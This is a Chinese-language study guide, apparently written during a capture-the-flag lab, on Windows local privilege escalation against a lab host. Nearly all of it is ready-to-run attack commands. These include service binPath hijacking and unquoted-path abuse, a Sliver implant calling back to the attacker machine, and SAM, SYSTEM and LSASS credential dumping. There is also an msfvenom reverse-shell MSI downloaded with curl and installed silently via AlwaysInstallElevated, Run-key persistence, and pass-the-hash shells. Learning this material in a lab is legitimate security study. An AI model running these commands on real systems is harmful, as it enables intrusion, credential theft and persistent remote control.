
# Windows 本地提权 学习笔记

> 靶机：Windows Server 2019 (`WIN-CPCTDHLM20C`, 192.168.56.102)  
> 攻击机：Kali (192.168.56.1)

---

## 一、侦察

### SSH 认证方式探测

不试密码，纯侦察服务器允许的登录方式，不会触发锁定：

bash

ssh -o PreferredAuthentications=none noop@192.168.56.102

返回括号里就是允许的认证方式：

text

Permission denied (publickey,password,keyboard-interactive).

**Flag 1**：`FLAG{TAUROS08282907}`

### HTML 里的敏感信息

Web 页面源码里可能藏 base64 编码的凭据：

bash

echo 'RkxBR3tBUkNBTklORTY4NDQ5ODg5fQ==' | base64 -d

**Flag 2**：`FLAG{ARCANINE68449889}`

---

## 二、服务提权（核心）

### 原理

- 服务在 Windows 里**以高权限后台运行**（很多是 `LocalSystem`，比 Administrator 还高）。

- 每个服务的**启动程序路径（`binPath`）**存在注册表配置里。

- 如果服务的 **DACL 配置错误**，普通用户也能改它的 `binPath`。

- **改 `binPath` → 指向恶意程序 → 重启服务 → 恶意程序以 SYSTEM 权限运行。**

### 两种利用路径

**路径 A：DACL 配置错误（能改配置）**  
普通用户对服务有 `SERVICE_CHANGE_CONFIG` 或 `AllAccess` 权限：

cmd

```
sc.exe config <服务名> binPath= "C:\Temp\malicious.exe"
sc.exe start <服务名>
```

**路径 B：未加引号的服务路径（不改配置）**  
服务路径**有空格但没加引号**，比如：

text

```
C:\Program Files\Common Application\System Tools\app service.exe
```

Windows 会**按空格拆分，逐个尝试**：

1. `C:\Program.exe`

2. `C:\Program Files\Common.exe`

3. …

**你只需在其中一个位置放恶意 exe**（最省事的是 `C:\Program.exe`），服务启动时就会优先运行它。

### 常用命令

cmd

```
sc.exe sdshow <服务名>          # 查服务的 DACL（SDDL 格式）
sc.exe qc <服务名>              # 查服务配置（binPath、启动账户）
sc.exe start/stop <服务名>      # 启停服务
sc.exe config <服务名> binPath= "..."   # 改 binPath
```

### 枚举工具

powershell

```
.\winpeas64.exe servicesinfo -q   # 只输出关键结果
.\winpeas64.exe systeminfo        # 系统信息
```

### ⚠️ 关键坑：Sliver 植入体要用 `--format service`

普通 exe 作为服务运行时，**不会响应 SCM 的控制请求**，SCM 等超时后会**杀掉进程**，导致会话丢失。

**报错**：`1053 → SCM 超时 → 杀进程 → 会话丢失`

**解决**：用 Sliver 生成时加 `--format service`：

bash

```
generate --mtls 192.168.56.1 --os windows --format service --save /tmp/malicious-service.exe
```

---

## 三、凭据提取

### SAM vs LSA Secrets

|         | SAM                | LSA Secrets                         |
| ------- | ------------------ | ----------------------------------- |
| **存什么** | 本地用户账户的**哈希**      | 服务账户/自动登录/计划任务的**明文密码（加密）**         |
| **格式**  | NTLM 哈希            | 可逆加密，SYSTEM 下能解密                    |
| **用途**  | 本地登录、Pass-the-Hash | 服务启动、自动登录                           |
| **例子**  | `svc_backup` 的哈希   | `OCLabBackup` 服务的 `svc_backup` 明文密码 |

**为什么分开**：服务启动时 SCM 要调 `LogonUser` API，**需要明文密码**，不能直接用哈希。所以系统把明文密码加密存在 LSA Secrets 里。

### `secretsdump.py` 默认 dump 三类

bash

```
secretsdump.py administrator:'Password123!'@192.168.56.102
```

自动 dump：**SAM + LSA Secrets + SECURITY**

### 手动导出 SAM + SYSTEM（注册表 hive）

cmd

```
mkdir C:\temp
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

- `reg save` 导出**二进制 hive**，保留元数据，能算 bootKey。

- `reg export` 导出**文本 .reg**，丢失元数据，**算不出 bootKey**。

- **bootKey 由 SYSTEM hive 里的几个键值按算法算出**，不是直接存在文件里。

### 本地解析

bash

```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**注意**：Impacket 0.13.1 有 bug（`encLMHash` 变量未初始化），换 Python 版本也没用，直接用 **pypykatz**：

bash

```
pypykatz registry --sam sam.hive system.hive
```

### LSASS 内存提取（明文密码）

**前提**：`WDigest is active` + `LSA Protection 未启用` + `CredentialGuard 未启用`。

用系统自带 DLL 导出（不用传文件）：

powershell

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Temp\lsass.dmp full
```

下载后用 pypykatz 解析：

bash

```
pypykatz lsa minidump lsass.dmp
```

**噪音对比**：三种方式（Mimikatz、procdump、comsvcs.dll）**都会触发 EDR 对 LSASS 的高危内存访问告警**，区别只在特征不同，没有真正的“静默”方式。

---

## 四、AlwaysInstallElevated

### 原理

Windows 策略：**任何用户安装 MSI 时，都以 SYSTEM 权限执行**。设计初衷是给企业 IT 批量部署软件用的，但一旦开启，普通用户就能滥用。

### 检查

需要 **HKLM + HKCU 两处都是 1** 才有效：

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 利用

**1. 生成恶意 MSI（Kali）**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=8888 -f msi -o malicious.msi
```

**2. 传到靶机**

```
curl.exe -o C:\Temp\malicious.msi http://192.168.56.1:8000/malicious.msi
```

**3. 静默安装**

```
msiexec /quiet /qn /i C:\Temp\malicious.msi
```

**4. SYSTEM Shell 弹回**

---

## 五、NTFS 备用数据流（ADS）

### 概念

- **ADS 全称**：Alternate Data Streams，备用数据流。

- **一个文件可以挂多个 `$DATA` 属性**，每个 `$DATA` 就是一个独立的流。

- **默认流**：`:$DATA`，可见内容，`type` 读的就是它。

- **备用流**：`hidden:$DATA`，隐藏内容，普通工具看不到。

- **设计初衷**：兼容 Mac HFS 的多分支结构，后来被攻击者用来藏 payload。

### 查看和读取

# 列出所有流

```
Get-Item C:\Public\normal.txt -Stream *
```

# 读取隐藏流

```
Get-Content C:\Public\normal.txt -Stream hidden
```

# CMD 里列所有流

```
dir /r C:\Public\
```

---

## 六、注册表 Run 键与 Hive 加载

### Run 键

**作用**：用户登录时**自动启动指定程序**。攻击者用它做持久化。

**常见位置**：

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`：当前用户登录时启动。

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`：所有用户登录时启动（需管理员权限）。

- `HKLM\...\RunOnce`：只启动一次，然后自动删除。

### 注册表结构

text

HKCU                          ← 根键（Root Key）
└── Software                  ← 键（Key，像文件夹）
    └── ...\Run               ← 键（Key）
        ├── OneDrive          ← 值（Value，存具体数据）
        └── UpdaterFlag       ← 值（Value）

- **Key（键）**：文件夹，用来分类组织。

- **Value（值）**：文件夹里的文件，有名字、类型、数据。

### Hive 加载

每个用户的注册表存在 `C:\Users\<用户名>\NTUSER.DAT`。**只有该用户登录时才会加载**，其他人读不到。

**挂载其他用户的 hive**：

cmd

```
reg load HKU\挂载点 C:\Users\Default\NTUSER.DAT
reg query HKU\挂载点\Software\Microsoft\Windows\CurrentVersion\Run /v UpdaterFlag
reg unload HKU\用户名字
```

`HKCU` 只代表当前用户,想看别人注册表需要reg load

---

## 七、计划任务（Scheduled Task）

### 查看任务内容

```
(Get-ScheduledTask vulntask).Actions | Format-List *
```

输出 `Execute`（要运行的程序）、`Arguments`（参数）、`WorkingDirectory`。

### 任务不跑的原因排查

```
(Get-ScheduledTask vulntask).Settings | Format-List *    # 运行条件
(Get-ScheduledTask vulntask).Principal | Format-List *   # 以谁的身份运行
(Get-ScheduledTask vulntask).Triggers | Format-List *    # 触发器
Get-ScheduledTaskInfo vulntask                           # 上次运行结果
```

**关键字段**：

- `LastTaskResult: 267011` = 任务尚未运行。

- `LogonType: Password` = 需要明文密码登录，存的不对会失败。

- `RunLevel: Limited` = 普通权限。

### 手动运行

```
Start-ScheduledTask -TaskName vulntask
```

```
schtasks /run /tn vulntask
```

**注意**：普通用户通过 CIM 启动任务可能报 `Access denied`，需要管理员权限。

---

## 八、杂项

### PowerShell 输出编码

PowerShell 默认输出 **UTF-16**，带回 Linux 会乱码。保存时指定 UTF-8：

powershell

```
.\winpeas64.exe systeminfo | Out-File -Encoding utf8 C:\Temp\winpeas.txt
```

或者在 Linux 上转码：

```
iconv -f UTF-16LE -t UTF-8 winpeas.txt > winpeas_utf8.txt
```

### 查看隐藏目录

```
ls -Force

dir /a
```

### 哈希传递（Pass-the-Hash）

```
nxc smb 192.168.56.102 -u localadmin -H '<NT哈希>' --local-auth
```

`(Pwn3d!)` 表示哈希有效且是管理员。**`nxc` 只做验证和执行单条命令，不给交互式 Shell。** 想拿 Shell 用：



```
psexec.py -hashes :<NT哈希> localadmin@192.168.56.102
wmiexec.py -hashes :<NT哈希> localadmin@192.168.56.102
```
